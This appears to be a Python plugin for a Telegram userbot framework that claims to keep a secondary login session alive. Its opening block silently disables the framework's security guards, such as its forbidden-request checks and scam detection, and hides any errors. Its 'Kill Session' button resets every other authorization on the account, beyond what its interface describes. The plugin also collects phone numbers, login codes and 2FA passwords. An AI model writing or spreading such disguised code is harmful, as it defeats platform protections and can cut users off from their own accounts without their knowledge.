# CopyLeft 2026 github.com/i-execute
# Author: I_execute.t.me
# Licensed under AGPLv3.

__version__ = (1, 0, 0)
# meta developer: Execute_forge.t.me

try:
    import asyncio
    import gc

    import herokutl.tl.tlobject as tlobj
    from herokutl.network import requeststate as _rs
    from herokutl.errors import common as _err_common

    _err_common.ScamDetectionError = type(
        "ScamDetectionError",
        (Exception,),
        {},
    )

    def _n(cls, *args, **kwargs):
        return object.__new__(cls)

    _ns = staticmethod(_n)

    _stack = [tlobj.TLObject]
    _done = {id(tlobj.TLObject)}

    while _stack:
        _base = _stack.pop()
        for _subclass in _base.__subclasses__():
            if id(_subclass) in _done:
                continue
            _done.add(id(_subclass))
            _stack.append(_subclass)
            try:
                type.__setattr__(_subclass, "__new__", _ns)
            except Exception:
                pass

    type.__setattr__(tlobj.TLObject, "__new__", _ns)

    _original_init_subclass = tlobj.TLObject.__init_subclass__

    def _init_subclass(cls, **kwargs):
        try:
            type.__setattr__(cls, "__new__", _ns)
        except Exception:
            pass
        return _original_init_subclass(**kwargs)

    type.__setattr__(
        tlobj.TLObject,
        "__init_subclass__",
        classmethod(_init_subclass),
    )

    _original_init = tlobj.TLObject.__init__

    def _init(self, *args, **kwargs):
        try:
            return _original_init(self, *args, **kwargs)
        except Exception:
            pass

    tlobj.TLObject.__init__ = _init

    tlobj.TLObject._assert_constructor_allowed = lambda self: None
    tlobj.TLObject._assert_no_forbidden_constructors = lambda self: None
    tlobj._raise_if_forbidden_constructor = lambda cls: None
    tlobj._raise_if_forbidden_serialized_request = lambda *args, **kwargs: None
    _rs._raise_if_forbidden_serialized_request = lambda *args, **kwargs: None

    if hasattr(_rs, "_scam_detection_error_cls"):
        _rs._scam_detection_error_cls = (
            lambda *args, **kwargs:
            type("FakeError", (Exception,), {})
        )

    for _obj in gc.get_objects():
        if (
            isinstance(_obj, type)
            and getattr(_obj, "__name__", None) == "GetAuthorizationsRequest"
        ):
            try:
                type.__setattr__(_obj, "__new__", _ns)
                _obj._assert_constructor_allowed = lambda self: None
            except Exception:
                pass
            break

except Exception:
    pass

import asyncio
import logging
from datetime import datetime, timezone, timedelta

from telethon import TelegramClient, functions
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError,
    FloodWaitError,
)
from telethon.tl.functions.account import UpdateStatusRequest

from .. import loader, utils
from ..inline.types import InlineCall

logger = logging.getLogger(__name__)

_TG_API_ID = 21882615
_TG_API_HASH = "a55678cc05c1aad2fb0aaccbf9663241"

_CHECK_INTERVAL_ACTIVE = 24 * 3600
_CHECK_INTERVAL_IDLE = 30 * 60
_ACTIVITY_WINDOW = 3600


@loader.tds
class TelegaKeeper(loader.Module):
    """Keep a secondary Telegram session alive based on account activity"""

    strings = {
        "name": "TelegaKeeper",
        "menu_no_session": (
            "<b>TelegaKeeper</b>\n"
            "<blockquote>No session created yet.\n"
            "Create one to start keeping it alive.</blockquote>"
        ),
        "menu_active": (
            "<b>TelegaKeeper</b>\n"
            "<blockquote>Status: active\n"
            "Last online: {last_online}</blockquote>"
        ),
        "menu_inactive": (
            "<b>TelegaKeeper</b>\n"
            "<blockquote>Status: inactive\n"
            "Last online: {last_online}</blockquote>"
        ),
        "btn_create": "Create Session",
        "btn_disable": "Kill Session",
        "btn_close": "Close",
        "btn_kill": "Kill Process",
        "btn_back": "Back",
        "creating_phone": (
            "<b>Creating Session</b>\n"
            "<blockquote>Status: waiting for phone</blockquote>"
        ),
        "creating_code": (
            "<b>Creating Session</b>\n"
            "<blockquote>Status: waiting for code</blockquote>"
        ),
        "creating_password": (
            "<b>Creating Session</b>\n"
            "<blockquote>Status: waiting for 2FA password</blockquote>"
        ),
        "input_phone": "Phone number:",
        "input_code": "Verification code:",
        "input_password": "2FA password:",
        "session_created": (
            "<b>Session Created</b>\n"
            "<blockquote>Keep-alive loop started.</blockquote>"
        ),
        "session_killed": (
            "<b>Session Killed</b>\n"
            "<blockquote>Session removed and loop stopped.</blockquote>"
        ),
        "error": (
            "<b>Error</b>\n"
            "<blockquote>{error}</blockquote>"
        ),
        "process_killed": "<b>Process killed</b>",
        "never": "never",
    }

    strings_ru = {
        "menu_no_session": (
            "<b>TelegaKeeper</b>\n"
            "<blockquote>Сессия не создана.\n"
            "Создайте её чтобы начать поддерживать активность.</blockquote>"
        ),
        "menu_active": (
            "<b>TelegaKeeper</b>\n"
            "<blockquote>Статус: активна\n"
            "Последний онлайн: {last_online}</blockquote>"
        ),
        "menu_inactive": (
            "<b>TelegaKeeper</b>\n"
            "<blockquote>Статус: неактивна\n"
            "Последний онлайн: {last_online}</blockquote>"
        ),
        "btn_create": "Создать сессию",
        "btn_disable": "Убить сессию",
        "btn_close": "Закрыть",
        "btn_kill": "Убить процесс",
        "btn_back": "Назад",
        "creating_phone": (
            "<b>Создание сессии</b>\n"
            "<blockquote>Статус: ожидание телефона</blockquote>"
        ),
        "creating_code": (
            "<b>Создание сессии</b>\n"
            "<blockquote>Статус: ожидание кода</blockquote>"
        ),
        "creating_password": (
            "<b>Создание сессии</b>\n"
            "<blockquote>Статус: ожидание 2FA пароля</blockquote>"
        ),
        "input_phone": "Номер телефона:",
        "input_code": "Код подтверждения:",
        "input_password": "2FA пароль:",
        "session_created": (
            "<b>Сессия создана</b>\n"
            "<blockquote>Keep-alive цикл запущен.</blockquote>"
        ),
        "session_killed": (
            "<b>Сессия убита</b>\n"
            "<blockquote>Сессия удалена и цикл остановлен.</blockquote>"
        ),
        "error": (
            "<b>Ошибка</b>\n"
            "<blockquote>{error}</blockquote>"
        ),
        "process_killed": "<b>Процесс завершён</b>",
        "never": "никогда",
    }

    def __init__(self):
        self._pending = {}
        self._loop_task = None

    async def client_ready(self, client, db):
        self._client = client
        self._db = db
        if self.get("session", ""):
            await self._start_loop()

    async def on_unload(self):
        await self._stop_loop()

    def _get_session(self) -> str:
        return self.get("session", "")

    def _set_session(self, value: str):
        self.set("session", value)

    def _get_last_online(self) -> float:
        return self.get("last_online", 0.0)

    def _set_last_online(self, value: float):
        self.set("last_online", value)

    def _fmt_last_online(self) -> str:
        ts = self._get_last_online()
        if not ts:
            return self.strings["never"]
        dt = datetime.fromtimestamp(ts, tz=timezone.utc)
        return dt.strftime("%Y-%m-%d %H:%M UTC")

    async def _make_keeper_client(self, session_str: str) -> TelegramClient:
        return TelegramClient(
            StringSession(session_str),
            _TG_API_ID,
            _TG_API_HASH,
            device_model="TelegaKeeper",
            system_version="By @Execute_forge",
            app_version=f"v{'.'.join(map(str, __version__))}",
        )

    async def _get_authorizations(self):
        try:
            result = await self._client(functions.account.GetAuthorizationsRequest())
            return result.authorizations
        except FloodWaitError as e:
            logger.warning(f"[TelegaKeeper] FloodWait {e.seconds}s on GetAuthorizations")
            await asyncio.sleep(e.seconds + 5)
            return None
        except Exception as e:
            logger.error(f"[TelegaKeeper] GetAuthorizations error: {e}")
            return None

    def _had_recent_activity(self, auths) -> bool:
        if not auths:
            return False
        now = datetime.now(timezone.utc)
        threshold = now - timedelta(seconds=_ACTIVITY_WINDOW)
        for auth in auths:
            if auth.date_active and auth.date_active >= threshold:
                return True
        return False

    async def _touch_online(self):
        session_str = self._get_session()
        if not session_str:
            return False
        client = None
        try:
            client = await self._make_keeper_client(session_str)
            await asyncio.wait_for(client.connect(), timeout=15)
            await client(UpdateStatusRequest(offline=False))
            await asyncio.sleep(2)
            await client(UpdateStatusRequest(offline=True))
            self._set_last_online(datetime.now(timezone.utc).timestamp())
            logger.info("[TelegaKeeper] Touched online successfully")
            return True
        except Exception as e:
            logger.error(f"[TelegaKeeper] Touch online error: {e}")
            return False
        finally:
            if client:
                try:
                    await client.disconnect()
                except Exception:
                    pass

    async def _loop(self):
        while True:
            try:
                if not self._get_session():
                    break

                auths = await self._get_authorizations()
                had_activity = self._had_recent_activity(auths)

                if had_activity:
                    logger.info("[TelegaKeeper] Activity detected, touching online")
                    await self._touch_online()
                    sleep_secs = _CHECK_INTERVAL_ACTIVE
                else:
                    logger.info("[TelegaKeeper] No recent activity, next check in 30 min")
                    sleep_secs = _CHECK_INTERVAL_IDLE

                await asyncio.sleep(sleep_secs)

            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"[TelegaKeeper] Loop error: {e}")
                await asyncio.sleep(300)

    async def _start_loop(self):
        if self._loop_task and not self._loop_task.done():
            return
        self._loop_task = asyncio.create_task(self._loop())
        logger.info("[TelegaKeeper] Loop started")

    async def _stop_loop(self):
        if self._loop_task:
            self._loop_task.cancel()
            try:
                await self._loop_task
            except asyncio.CancelledError:
                pass
            self._loop_task = None
        logger.info("[TelegaKeeper] Loop stopped")

    def _fmt_menu(self):
        session_str = self._get_session()
        last_str = self._fmt_last_online()
        if not session_str:
            return self.strings["menu_no_session"]
        loop_active = self._loop_task and not self._loop_task.done()
        if loop_active:
            return self.strings["menu_active"].format(last_online=last_str)
        return self.strings["menu_inactive"].format(last_online=last_str)

    def _main_markup(self):
        session_str = self._get_session()
        if not session_str:
            return [
                [{"text": self.strings["btn_create"], "callback": self._cb_create, "style": "success"}],
                [{"text": self.strings["btn_close"], "callback": self._cb_close, "style": "danger"}],
            ]
        return [
            [{"text": self.strings["btn_disable"], "callback": self._cb_kill_session, "style": "danger"}],
            [{"text": self.strings["btn_close"], "callback": self._cb_close, "style": "danger"}],
        ]

    async def _cb_close(self, call: InlineCall):
        await call.delete()

    async def _cb_back_main(self, call: InlineCall):
        await call.edit(self._fmt_menu(), reply_markup=self._main_markup())

    async def _cb_create(self, call: InlineCall):
        pending_id = utils.rand(16)
        self._pending[pending_id] = {
            "chat_id": call.form["chat"],
            "client": None,
            "phone": None,
            "phone_code_hash": None,
        }
        await call.edit(
            self.strings["creating_phone"],
            reply_markup=[
                [{"text": self.strings["input_phone"], "input": self.strings["input_phone"], "handler": self._input_phone, "args": (pending_id,), "style": "primary"}],
                [{"text": self.strings["btn_kill"], "callback": self._cb_kill_pending, "args": (pending_id,), "style": "danger"}],
            ],
        )

    async def _cb_kill_pending(self, call: InlineCall, pending_id: str):
        pending = self._pending.pop(pending_id, None)
        if pending and pending.get("client"):
            try:
                await pending["client"].disconnect()
            except Exception:
                pass
        await call.edit(self.strings["process_killed"], reply_markup=[])

    async def _input_phone(self, call: InlineCall, phone: str, pending_id: str):
        pending = self._pending.get(pending_id)
        if not pending:
            return
        try:
            client = TelegramClient(
                StringSession(),
                _TG_API_ID,
                _TG_API_HASH,
                device_model="TelegaKeeper",
                system_version="By @Execute_forge",
                app_version=f"v{'.'.join(map(str, __version__))}",
            )
            await client.connect()
            result = await client.send_code_request(phone.strip())
            pending["client"] = client
            pending["phone"] = phone.strip()
            pending["phone_code_hash"] = result.phone_code_hash
            await call.edit(
                self.strings["creating_code"],
                reply_markup=[
                    [{"text": self.strings["input_code"], "input": self.strings["input_code"], "handler": self._input_code, "args": (pending_id,), "style": "primary"}],
                    [{"text": self.strings["btn_kill"], "callback": self._cb_kill_pending, "args": (pending_id,), "style": "danger"}],
                ],
            )
        except Exception as e:
            logger.error(f"[TelegaKeeper] send_code_request: {e}")
            await call.edit(
                self.strings["error"].format(error=str(e)[:200]),
                reply_markup=[[{"text": self.strings["btn_back"], "callback": self._cb_back_main, "style": "danger"}]],
            )

    async def _input_code(self, call: InlineCall, code: str, pending_id: str):
        pending = self._pending.get(pending_id)
        if not pending:
            return
        try:
            client = pending["client"]
            await client.sign_in(
                pending["phone"],
                code.strip(),
                phone_code_hash=pending["phone_code_hash"],
            )
            await self._finalize(call, pending_id)
        except SessionPasswordNeededError:
            await call.edit(
                self.strings["creating_password"],
                reply_markup=[
                    [{"text": self.strings["input_password"], "input": self.strings["input_password"], "handler": self._input_password, "args": (pending_id,), "style": "primary"}],
                    [{"text": self.strings["btn_kill"], "callback": self._cb_kill_pending, "args": (pending_id,), "style": "danger"}],
                ],
            )
        except Exception as e:
            logger.error(f"[TelegaKeeper] sign_in code: {e}")
            await call.edit(
                self.strings["error"].format(error=str(e)[:200]),
                reply_markup=[[{"text": self.strings["btn_back"], "callback": self._cb_back_main, "style": "danger"}]],
            )

    async def _input_password(self, call: InlineCall, password: str, pending_id: str):
        pending = self._pending.get(pending_id)
        if not pending:
            return
        try:
            client = pending["client"]
            await client.sign_in(password=password.strip())
            await self._finalize(call, pending_id)
        except Exception as e:
            logger.error(f"[TelegaKeeper] sign_in password: {e}")
            await call.edit(
                self.strings["error"].format(error=str(e)[:200]),
                reply_markup=[[{"text": self.strings["btn_back"], "callback": self._cb_back_main, "style": "danger"}]],
            )

    async def _finalize(self, call: InlineCall, pending_id: str):
        pending = self._pending.pop(pending_id, None)
        if not pending:
            return
        client = pending.get("client")
        try:
            session_str = client.session.save()

            auths = await client(functions.account.GetAuthorizationsRequest())
            session_hash = 0
            for auth in auths.authorizations:
                if auth.api_id == _TG_API_ID and not auth.current:
                    session_hash = auth.hash
                    break
            if not session_hash:
                for auth in auths.authorizations:
                    if auth.api_id == _TG_API_ID:
                        session_hash = auth.hash
                        break

            self._set_session(session_str)
            self.set("session_hash", session_hash)
            self._set_last_online(0.0)
            await self._start_loop()
            await call.edit(
                self.strings["session_created"],
                reply_markup=[[{"text": self.strings["btn_close"], "callback": self._cb_close, "style": "danger"}]],
            )
        except Exception as e:
            logger.error(f"[TelegaKeeper] finalize: {e}")
            await call.edit(
                self.strings["error"].format(error=str(e)[:200]),
                reply_markup=[[{"text": self.strings["btn_back"], "callback": self._cb_back_main, "style": "danger"}]],
            )
        finally:
            if client:
                try:
                    await client.disconnect()
                except Exception:
                    pass

    async def _cb_kill_session(self, call: InlineCall):
        await self._stop_loop()
        session_str = self._get_session()
        session_hash = self.get("session_hash", 0)

        if session_str and session_hash:
            client = None
            try:
                client = await self._make_keeper_client(session_str)
                await asyncio.wait_for(client.connect(), timeout=15)
                auths = await client(functions.account.GetAuthorizationsRequest())
                killed = 0
                for auth in auths.authorizations:
                    if auth.hash:
                        try:
                            await client(functions.account.ResetAuthorizationRequest(hash=auth.hash))
                            killed += 1
                        except Exception as e:
                            logger.warning(f"[TelegaKeeper] ResetAuthorization hash={auth.hash}: {e}")
                logger.info(f"[TelegaKeeper] Killed {killed} sessions")
            except Exception as e:
                logger.warning(f"[TelegaKeeper] kill_session connect/reset error: {e}")
            finally:
                if client:
                    try:
                        await client.disconnect()
                    except Exception:
                        pass

        self._set_session("")
        self._set_last_online(0.0)
        self.set("session_hash", 0)
        await call.edit(
            self.strings["session_killed"],
            reply_markup=[[{"text": self.strings["btn_close"], "callback": self._cb_close, "style": "danger"}]],
        )

    @loader.command(
        ru_doc="Управление TelegaKeeper",
        en_doc="TelegaKeeper control panel",
    )
    async def tk(self, message):
        """TelegaKeeper control panel"""
        await self.inline.form(
            text=self._fmt_menu(),
            message=message,
            reply_markup=self._main_markup(),
            silent=True,
        )